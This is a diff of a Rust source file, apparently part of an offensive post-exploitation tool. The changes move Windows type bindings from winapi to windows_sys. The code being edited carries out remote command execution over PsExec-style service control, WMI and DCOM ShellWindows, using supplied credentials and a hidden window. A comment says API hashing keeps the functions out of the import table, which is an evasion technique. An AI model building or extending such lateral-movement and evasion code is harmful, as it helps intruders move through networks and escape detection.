@@ -127,18 +127,18 @@ type FnCoInitializeSecurity = unsafe extern "system" fn(
     *mut std::ffi::c_void,
 ) -> i32;
 type FnCoSetProxyBlanket = unsafe extern "system" fn(
-    *mut winapi::um::unknwnbase::IUnknown,
+    *mut crate::win_types::IUnknown,
     u32,
     u32,
     *mut u16,
     u32,
     u32,
-    *mut winapi::shared::wtypesbase::COAUTHIDENTITY,
+    *mut windows_sys::Win32::System::Com::COAUTHIDENTITY,
     u32,
 ) -> i32;
 type FnGetLastError = unsafe extern "system" fn() -> u32;
 type FnWNetAddConnection2W = unsafe extern "system" fn(
-    *mut winapi::um::winnetwk::NETRESOURCEW,
+    *mut windows_sys::Win32::NetworkManagement::WNet::NETRESOURCEW,
     *const u16,
     *const u16,
     u32,
@@ -193,7 +193,7 @@ struct ServiceStatus {
 const SERVICE_STOPPED: u32 = 1;
 
 /// Null GUID used as the IID parameter in IDispatch::GetIDsOfNames / Invoke.
-const IID_NULL: winapi::shared::guiddef::GUID = winapi::shared::guiddef::GUID {
+const IID_NULL: crate::win_types::GUID = crate::win_types::GUID {
     Data1: 0,
     Data2: 0,
     Data3: 0,
@@ -418,14 +418,14 @@ pub fn psexec_exec(
 // in the IAT — all function pointers are obtained through the pe_resolve
 // API-hashing resolver at runtime.
 
-use winapi::shared::guiddef::{GUID, REFIID};
-use winapi::shared::winerror::{HRESULT, SUCCEEDED};
-use winapi::shared::wtypes::BSTR;
-use winapi::shared::wtypesbase::CLSCTX_INPROC_SERVER;
-use winapi::um::oaidl::VARIANT;
-use winapi::um::unknwnbase::IUnknown;
+use crate::win_types::{GUID, REFIID};
+use crate::win_types::HRESULT;
+use crate::win_types::BSTR;
+use windows_sys::Win32::System::Com::CLSCTX_INPROC_SERVER;
+use windows_sys::Win32::System::Variant::VARIANT;
+use crate::win_types::IUnknown;
 
-type LONG = winapi::um::winnt::LONG;
+type LONG = crate::win_types::LONG;
 
 // ── WMI COM interface definitions ──────────────────────────────────────────
 
@@ -751,8 +751,8 @@ unsafe fn wmi_put_bstr_prop(obj: *mut IWbemClassObject, name: &str, value: &str)
     let name_bstr = wmi_alloc_bstr(name);
     let val_bstr = wmi_alloc_bstr(value);
     let mut var: VARIANT = std::mem::zeroed();
-    var.n1.n2_mut().vt = VT_BSTR;
-    *var.n1.n2_mut().n3.bstrVal_mut() = val_bstr;
+    var.Anonymous.Anonymous.vt = VT_BSTR;
+    var.Anonymous.Anonymous.Anonymous.bstrVal = val_bstr;
     let hr = ((*(*obj).lpvtbl).put)(obj, name_bstr, 0, &mut var, 0);
     wmi_free_bstr(val_bstr);
     wmi_free_bstr(name_bstr);
@@ -772,12 +772,12 @@ unsafe fn wmi_get_i4_prop(obj: *mut IWbemClassObject, name: &str) -> Option<i32>
         ptr::null_mut(),
     );
     wmi_free_bstr(name_bstr);
-    if !SUCCEEDED(hr) {
+    if !(hr >= 0) {
         return None;
     }
     // vt == VT_I4 → the union field is lVal
-    if var.n1.n2().vt == VT_I4 {
-        Some(unsafe { *var.n1.n2().n3.lVal() })
+    if var.Anonymous.Anonymous.vt == VT_I4 {
+        Some(unsafe { var.Anonymous.Anonymous.Anonymous.lVal })
     } else {
         None
     }
@@ -826,7 +826,7 @@ pub fn wmi_exec(
             &mut locator_ptr as *mut _ as *mut *mut std::ffi::c_void,
         )
     };
-    if !SUCCEEDED(hr) {
+    if !(hr >= 0) {
         return Err(anyhow!(
             "CoCreateInstance(WbemLocator) failed: 0x{:08X}",
             hr as u32
@@ -861,7 +861,7 @@ pub fn wmi_exec(
             wmi_free_bstr(b);
         }
     }
-    if !SUCCEEDED(hr) {
+    if !(hr >= 0) {
         unsafe {
             ((*(*locator_ptr).lpvtbl).release)(locator_ptr);
         }
@@ -889,7 +889,7 @@ pub fn wmi_exec(
             EOAC_NONE,
         )
     };
-    if !SUCCEEDED(hr) {
+    if !(hr >= 0) {
         unsafe {
             ((*(*services_ptr).lpvtbl).release)(services_ptr);
             ((*(*locator_ptr).lpvtbl).release)(locator_ptr);
@@ -913,7 +913,7 @@ pub fn wmi_exec(
     unsafe {
         wmi_free_bstr(class_bstr);
     }
-    if !SUCCEEDED(hr) {
+    if !(hr >= 0) {
         unsafe {
             ((*(*services_ptr).lpvtbl).release)(services_ptr);
             ((*(*locator_ptr).lpvtbl).release)(locator_ptr);
@@ -956,7 +956,7 @@ pub fn wmi_exec(
     unsafe {
         ((*(*class_obj).lpvtbl).release)(class_obj);
     }
-    if !SUCCEEDED(hr) {
+    if !(hr >= 0) {
         unsafe {
             ((*(*services_ptr).lpvtbl).release)(services_ptr);
             ((*(*locator_ptr).lpvtbl).release)(locator_ptr);
@@ -993,7 +993,7 @@ pub fn wmi_exec(
         wmi_free_bstr(method_bstr);
         ((*(*in_params).lpvtbl).release)(in_params);
     }
-    if !SUCCEEDED(hr) {
+    if !(hr >= 0) {
         unsafe {
             ((*(*services_ptr).lpvtbl).release)(services_ptr);
             ((*(*locator_ptr).lpvtbl).release)(locator_ptr);
@@ -1098,9 +1098,9 @@ struct IDispatch {
 
 /// Build a `COSERVERINFO` structure targeting the remote host.
 /// Returns (COSERVERINFO, wide_name_vec) — the Vec must outlive the info.
-fn build_co_server_info(host: &str) -> (winapi::um::objidlbase::COSERVERINFO, Vec<u16>) {
+fn build_co_server_info(host: &str) -> (windows_sys::Win32::System::Com::COSERVERINFO, Vec<u16>) {
     let name_w = wide(host);
-    let mut info: winapi::um::objidlbase::COSERVERINFO = unsafe { std::mem::zeroed() };
+    let mut info: windows_sys::Win32::System::Com::COSERVERINFO = unsafe { std::mem::zeroed() };
     info.pwszName = name_w.as_ptr() as *mut _;
     (info, name_w)
 }
@@ -1132,9 +1132,9 @@ pub fn dcom_exec(
         REFIID,
         *mut IUnknown,
         u32,
-        *mut winapi::um::objidlbase::COSERVERINFO,
+        *mut windows_sys::Win32::System::Com::COSERVERINFO,
         u32,
-        *mut winapi::um::objidlbase::MULTI_QI,
+        *mut windows_sys::Win32::System::Com::MULTI_QI,
     ) -> HRESULT = unsafe { std::mem::transmute(co_create_instance_ex_addr) };
 
     let _com = ComGuard::new();
@@ -1165,7 +1165,7 @@ pub fn dcom_exec(
     let (_auth_identity, _user_w, _pass_w, _domain_w) = if let (Some(user), Some(pass)) =
         (username, password)
     {
-        let mut identity: winapi::shared::wtypesbase::COAUTHIDENTITY =
+        let mut identity: windows_sys::Win32::System::Com::COAUTHIDENTITY =
             unsafe { std::mem::zeroed() };
         let user_wide: Vec<u16> = user.encode_utf16().collect();
         let pass_wide: Vec<u16> = pass.encode_utf16().collect();
@@ -1191,7 +1191,7 @@ pub fn dcom_exec(
         identity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
 
         // Set up COAUTHINFO
-        let mut auth_info: winapi::shared::wtypesbase::COAUTHINFO = unsafe { std::mem::zeroed() };
+        let mut auth_info: windows_sys::Win32::System::Com::COAUTHINFO = unsafe { std::mem::zeroed() };
         auth_info.dwAuthnSvc = RPC_C_AUTHN_WINNT;
         auth_info.dwAuthzSvc = RPC_C_AUTHZ_NONE;
         auth_info.pwszServerPrincName = ptr::null_mut();
@@ -1204,7 +1204,7 @@ pub fn dcom_exec(
         (identity, user_part_owned, pass_wide, domain_wide)
     } else {
         let empty: Vec<u16> = Vec::new();
-        unsafe { std::mem::zeroed::<winapi::shared::wtypesbase::COAUTHIDENTITY>() };
+        unsafe { std::mem::zeroed::<windows_sys::Win32::System::Com::COAUTHIDENTITY>() };
         (
             unsafe { std::mem::zeroed() },
             empty.clone(),
@@ -1213,7 +1213,7 @@ pub fn dcom_exec(
         )
     };
 
-    let mut mq: winapi::um::objidlbase::MULTI_QI = unsafe { std::mem::zeroed() };
+    let mut mq: windows_sys::Win32::System::Com::MULTI_QI = unsafe { std::mem::zeroed() };
     mq.pIID = &IID_IDISPATCH as *const _ as *const _;
 
     let hr = unsafe {
@@ -1226,7 +1226,7 @@ pub fn dcom_exec(
             &mut mq,
         )
     };
-    if !SUCCEEDED(hr) || mq.pItf.is_null() {
+    if !(hr >= 0) || mq.pItf.is_null() {
         return Err(anyhow!(
             "CoCreateInstanceEx(ShellWindows) on {} failed: 0x{:08X}",
             target_host,
@@ -1252,7 +1252,7 @@ pub fn dcom_exec(
             EOAC_NONE,
         )
     };
-    if !SUCCEEDED(hr) {
+    if !(hr >= 0) {
         unsafe {
             ((*(*shell_dispatch).lpvtbl).release)(shell_dispatch);
         }
@@ -1278,7 +1278,7 @@ pub fn dcom_exec(
     unsafe {
         wmi_free_bstr(method_name);
     }
-    if !SUCCEEDED(hr) {
+    if !(hr >= 0) {
         unsafe {
             ((*(*shell_dispatch).lpvtbl).release)(shell_dispatch);
         }
@@ -1298,28 +1298,28 @@ pub fn dcom_exec(
     // Build the DISPPARAMS: positional args are passed in reverse order.
     let mut var_cmd: VARIANT = unsafe { std::mem::zeroed() };
     unsafe {
-        var_cmd.n1.n2_mut().vt = VT_BSTR;
-        *var_cmd.n1.n2_mut().n3.bstrVal_mut() = args_bstr; // index 0 = Args
+        var_cmd.Anonymous.Anonymous.vt = VT_BSTR;
+        var_cmd.Anonymous.Anonymous.Anonymous.bstrVal = args_bstr; // index 0 = Args
     }
     let mut var_dir: VARIANT = unsafe { std::mem::zeroed() };
     unsafe {
-        var_dir.n1.n2_mut().vt = VT_BSTR;
-        *var_dir.n1.n2_mut().n3.bstrVal_mut() = empty_bstr; // index 1 = Dir (empty)
+        var_dir.Anonymous.Anonymous.vt = VT_BSTR;
+        var_dir.Anonymous.Anonymous.Anonymous.bstrVal = empty_bstr; // index 1 = Dir (empty)
     }
     let mut var_op: VARIANT = unsafe { std::mem::zeroed() };
     unsafe {
-        var_op.n1.n2_mut().vt = VT_BSTR;
-        *var_op.n1.n2_mut().n3.bstrVal_mut() = open_bstr; // index 2 = Operation
+        var_op.Anonymous.Anonymous.vt = VT_BSTR;
+        var_op.Anonymous.Anonymous.Anonymous.bstrVal = open_bstr; // index 2 = Operation
     }
     let mut var_show: VARIANT = unsafe { std::mem::zeroed() };
     unsafe {
-        var_show.n1.n2_mut().vt = VT_I4;
-        *var_show.n1.n2_mut().n3.lVal_mut() = 0; // index 3 = Show (0 = SW_HIDE)
+        var_show.Anonymous.Anonymous.vt = VT_I4;
+        var_show.Anonymous.Anonymous.Anonymous.lVal = 0; // index 3 = Show (0 = SW_HIDE)
     }
     let mut var_file: VARIANT = unsafe { std::mem::zeroed() };
     unsafe {
-        var_file.n1.n2_mut().vt = VT_BSTR;
-        *var_file.n1.n2_mut().n3.bstrVal_mut() = cmd_bstr; // index 4 = File
+        var_file.Anonymous.Anonymous.vt = VT_BSTR;
+        var_file.Anonymous.Anonymous.Anonymous.bstrVal = cmd_bstr; // index 4 = File
     }
 
     // DISPPARAMS: args in reverse order (right-to-left for positional).
@@ -1363,7 +1363,7 @@ pub fn dcom_exec(
         ((*(*shell_dispatch).lpvtbl).release)(shell_dispatch);
     }
 
-    if !SUCCEEDED(hr) {
+    if !(hr >= 0) {
         return Err(anyhow!(
             "ShellExecute Invoke on {} failed: 0x{:08X}",
             target_host,
@@ -1582,7 +1582,7 @@ struct RemoteCreds {
 
 impl RemoteCreds {
     fn new(host: &str, username: &str, password: &str) -> Result<Self> {
-        use winapi::um::winnetwk::NETRESOURCEW;
+        use windows_sys::Win32::NetworkManagement::WNet::NETRESOURCEW;
         const RESOURCETYPE_ANY: u32 = 0;
 
         let wnet_add: FnWNetAddConnection2W = unsafe {
